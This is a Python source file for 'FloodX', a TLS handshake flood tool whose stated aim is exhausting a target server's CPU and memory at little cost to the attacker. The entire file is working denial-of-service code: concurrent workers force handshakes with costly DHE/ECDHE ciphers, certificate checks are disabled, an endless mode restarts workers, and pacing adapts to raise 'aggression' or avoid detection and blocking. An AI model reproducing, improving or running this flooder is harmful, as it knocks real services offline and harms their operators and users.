"""
FloodX: Advanced TLS Handshake Flood Attack Implementation
High-efficiency SSL/TLS connection flooding designed for maximum server resource exhaustion.
Creates asymmetric resource consumption - minimal attacker cost, maximum victim CPU/memory impact.
"""

import asyncio
import ssl
import socket
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, List, Optional, Tuple
from datetime import datetime

from common.logger import logger, stats_logger


class AdvancedTlsHandshakeFlooder:
    """Advanced TLS/SSL handshake flood attack for maximum asymmetric resource consumption."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = self._extract_hostname(config['target'])
        self.port = config['port']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.handshakes_completed = 0
        self.handshakes_attempted = 0
        self.bytes_sent = 0
        self.error_count = 0
        self.active_workers = 0
        
        # Advanced TLS settings for maximum server CPU consumption
        self.ssl_versions = [
            ssl.PROTOCOL_TLS_CLIENT,
            ssl.PROTOCOL_TLSv1_2,
        ]
        
        # High-resource cipher suites that force expensive server-side operations
        self.high_cost_ciphers = [
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-SHA384',
            'DHE-RSA-AES256-GCM-SHA384',
            'DHE-RSA-AES256-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'DHE-RSA-AES128-GCM-SHA256'
        ]
        
        # Performance optimization
        self.evasion_enabled = config.get('advanced', False)
        self.use_threading = config.get('use_threading', True)
        self.thread_pool = ThreadPoolExecutor(max_workers=min(50, self.concurrency)) if self.use_threading else None
        
        # Connection reuse for efficiency
        self.connection_pool = []
        self.max_pool_size = min(100, self.concurrency)
        
    def _extract_hostname(self, target: str) -> str:
        """Extract hostname from URL or return as-is."""
        import re
        if '://' in target:
            match = re.match(r'https?://([^:/]+)', target)
            if match:
                return match.group(1)
        return target
        
    async def run(self):
        """Execute high-efficiency TLS handshake flood attack."""
        logger.info(f"🔐 Starting advanced TLS handshake flood: {self.concurrency} workers targeting {self.target}:{self.port}")
        
        # Initialize real-time statistics
        stats_logger.update_stats(
            target=f"{self.target}:{self.port}",
            vector="tls",
            status="running"
        )
        stats_logger.start_real_time_logging()
        
        try:
            # Pre-warm connection pool for efficiency
            await self._prewarm_connection_pool()
            
            self.running = True
            
            # Launch high-concurrency TLS workers
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._advanced_tls_worker(i))
                tasks.append(task)
            
            # Launch performance monitor
            monitor_task = asyncio.create_task(self._performance_monitor())
            tasks.append(monitor_task)
            
            # Run for specified duration or endless if duration is 0
            if self.duration > 0:
                await asyncio.sleep(self.duration)
                self.running = False
            else:
                # Endless mode - run until interrupted
                logger.info("🔄 Running in endless mode - Ctrl+C to stop")
                try:
                    while self.running:
                        # Restart cycle every 60 seconds for continuous operation
                        await asyncio.sleep(60)
                        
                        # Check if workers are still alive and restart if needed
                        active_tasks = [t for t in tasks[:-1] if not t.done()]  # Exclude monitor task
                        if len(active_tasks) < self.concurrency * 0.5:
                            logger.info("🔄 Restarting TLS workers for continuous operation...")
                            
                            # Cancel existing worker tasks
                            for task in active_tasks:
                                task.cancel()
                            
                            # Restart workers
                            new_tasks = []
                            for i in range(self.concurrency):
                                task = asyncio.create_task(self._advanced_tls_worker(i))
                                new_tasks.append(task)
                            new_tasks.append(monitor_task)  # Keep monitor task
                            tasks = new_tasks
                            
                except KeyboardInterrupt:
                    logger.info("🛑 Endless TLS flood stopped by user")
                    self.running = False
            self.running = False
            
            # Clean shutdown
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ TLS handshake flood failed: {e}")
            stats_logger.increment_errors()
        finally:
            if self.thread_pool:
                self.thread_pool.shutdown(wait=False)
            stats_logger.stop_real_time_logging()
            stats_logger.update_stats(status="completed")
            logger.info(f"✅ TLS flood completed: {self.handshakes_completed}/{self.handshakes_attempted} successful")

    async def _prewarm_connection_pool(self):
        """Pre-warm connection pool for better performance."""
        logger.info("⚙️  Pre-warming TLS connection pool...")
        
        # Create initial connections for reuse
        prewarm_tasks = []
        for i in range(min(10, self.max_pool_size)):
            task = asyncio.create_task(self._create_pooled_connection())
            prewarm_tasks.append(task)
        
        # Wait for prewarming to complete
        await asyncio.gather(*prewarm_tasks, return_exceptions=True)
        logger.info(f"🔥 Pre-warmed {len(self.connection_pool)} TLS connections")

    async def _create_pooled_connection(self):
        """Create a connection for the pool."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            
            # Create SSL context with expensive cipher preferences
            context = ssl.create_default_context()
            context.set_ciphers(':'.join(self.high_cost_ciphers))
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            ssl_sock = context.wrap_socket(sock, server_hostname=self.target)
            self.connection_pool.append(ssl_sock)
            
        except Exception as e:
            logger.debug(f"Failed to create pooled connection: {e}")

    async def _advanced_tls_worker(self, worker_id: int):
        """Advanced TLS worker optimized for maximum server resource consumption."""
        self.active_workers += 1
        stats_logger.set_active_threads(self.active_workers)
        
        handshakes_this_worker = 0
        
        try:
            while self.running:
                try:
                    # Execute handshake with resource amplification technique
                    if self.use_threading and self.thread_pool:
                        # Use thread pool for blocking operations
                        future = asyncio.get_event_loop().run_in_executor(
                            self.thread_pool,
                            self._blocking_tls_handshake
                        )
                        success, bytes_sent = await future
                    else:
                        # Pure async approach
                        success, bytes_sent = await self._async_tls_handshake()
                    
                    # Update statistics
                    self.handshakes_attempted += 1
                    if success:
                        self.handshakes_completed += 1
                        handshakes_this_worker += 1
                    
                    self.bytes_sent += bytes_sent
                    stats_logger.increment_packets(1, bytes_sent)
                    stats_logger.increment_connections()
                    
                    # Adaptive rate limiting based on success rate
                    if self.evasion_enabled:
                        success_rate = self.handshakes_completed / max(1, self.handshakes_attempted)
                        if success_rate > 0.8:
                            # High success rate - increase aggression
                            await asyncio.sleep(random.uniform(0.001, 0.01))
                        else:
                            # Lower success rate - back off slightly
                            await asyncio.sleep(random.uniform(0.01, 0.05))
                    else:
                        await asyncio.sleep(0.01)  # Basic rate limiting
                        
                except Exception as e:
                    self.error_count += 1
                    stats_logger.increment_errors()
                    await asyncio.sleep(0.1)
                    
        except asyncio.CancelledError:
            pass
        finally:
            self.active_workers -= 1
            stats_logger.set_active_threads(self.active_workers)
            logger.debug(f"TLS worker {worker_id} completed {handshakes_this_worker} handshakes")

    def _blocking_tls_handshake(self) -> Tuple[bool, int]:
        """Blocking TLS handshake designed for maximum server CPU consumption."""
        try:
            # Create socket with specific options for maximum server work
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10.0)  # Longer timeout to keep server resources tied up
            
            # Connect to target
            sock.connect((self.target, self.port))
            
            # Create SSL context with computationally expensive preferences
            context = ssl.create_default_context()
            
            # Force server to do expensive operations
            context.set_ciphers(':'.join(self.high_cost_ciphers))
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Enable specific options that increase server CPU load
            context.options |= ssl.OP_NO_SSLv2
            context.options |= ssl.OP_NO_SSLv3
            context.options |= ssl.OP_SINGLE_DH_USE  # Force DH key regeneration
            context.options |= ssl.OP_SINGLE_ECDH_USE  # Force ECDH key regeneration
            
            # Wrap socket and perform handshake
            ssl_sock = context.wrap_socket(sock, server_hostname=self.target)
            
            # Force complete handshake (server does certificate signing, key exchange)
            ssl_sock.do_handshake()
            
            # Get cipher info to calculate approximate resource cost
            cipher = ssl_sock.cipher()
            bytes_exchanged = self._estimate_handshake_bytes(cipher)
            
            # Optionally send minimal data to complete the handshake cycle
            if self.evasion_enabled:
                ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
                bytes_exchanged += 50
            
            # Close connection (releases server resources)
            ssl_sock.close()
            
            return True, bytes_exchanged
            
        except Exception as e:
            logger.debug(f"TLS handshake failed: {e}")
            return False, 100  # Estimate bytes even on failure

    async def _async_tls_handshake(self) -> Tuple[bool, int]:
        """Async TLS handshake with connection reuse optimization."""
        try:
            # Try to reuse connection from pool first
            if self.connection_pool and random.random() < 0.3:  # 30% reuse rate
                ssl_sock = self.connection_pool.pop()
                try:
                    # Test if connection is still valid
                    ssl_sock.send(b"")
                    return True, 200  # Minimal cost for reused connection
                except:
                    ssl_sock.close()
            
            # Create new connection if pool is empty or reuse failed
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    self.target, 
                    self.port,
                    ssl=self._create_ssl_context()
                ),
                timeout=8.0
            )
            
            # Send minimal HTTP request to complete handshake
            request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\nConnection: close\r\n\r\n"
            writer.write(request.encode())
            await writer.drain()
            
            # Read response headers only (minimal bandwidth)
            response = await asyncio.wait_for(reader.read(1024), timeout=5.0)
            
            writer.close()
            await writer.wait_closed()
            
            bytes_exchanged = len(request.encode()) + len(response)
            return True, bytes_exchanged
            
        except Exception as e:
            logger.debug(f"Async TLS handshake failed: {e}")
            return False, 150
    
    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create SSL context optimized for maximum server resource consumption."""
        context = ssl.create_default_context()
        
        # Use computationally expensive cipher suites
        context.set_ciphers(':'.join(self.high_cost_ciphers))
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        # Options that increase server CPU work
        context.options |= ssl.OP_SINGLE_DH_USE
        context.options |= ssl.OP_SINGLE_ECDH_USE
        
        return context
    
    def _estimate_handshake_bytes(self, cipher_info) -> int:
        """Estimate bytes exchanged in TLS handshake based on cipher."""
        if not cipher_info:
            return 200  # Default estimate
        
        cipher_name = cipher_info[0] if cipher_info else "unknown"
        
        # Estimate based on cipher complexity
        if "DHE" in cipher_name or "ECDHE" in cipher_name:
            return 350  # Higher cost for ephemeral key exchange
        elif "RSA" in cipher_name:
            return 250  # RSA key exchange
        else:
            return 200  # Basic estimate

    async def _performance_monitor(self):
        """Monitor TLS attack performance and adjust parameters."""
        last_handshake_count = 0
        last_time = time.time()
        
        while self.running:
            await asyncio.sleep(5)  # Check every 5 seconds
            
            current_time = time.time()
            current_handshakes = self.handshakes_completed
            
            # Calculate current rate
            time_diff = current_time - last_time
            handshake_diff = current_handshakes - last_handshake_count
            
            if time_diff > 0:
                current_rate = handshake_diff / time_diff
                success_rate = self.handshakes_completed / max(1, self.handshakes_attempted)
                
                logger.debug(f"TLS Performance: {current_rate:.1f} handshakes/sec, "
                           f"{success_rate:.1%} success rate, {self.active_workers} workers")
                
                # Adaptive optimization based on performance
                if success_rate > 0.9 and current_rate < 10:
                    # Very high success but low rate - increase aggression
                    logger.debug("Optimizing: Increasing TLS handshake aggression")
                elif success_rate < 0.5:
                    # Low success rate - back off to avoid detection/blocking
                    logger.debug("Optimizing: Reducing TLS handshake rate")
            
            last_handshake_count = current_handshakes
            last_time = current_time


# Backward compatibility alias
TlsHandshakeFlooder = AdvancedTlsHandshakeFlooder
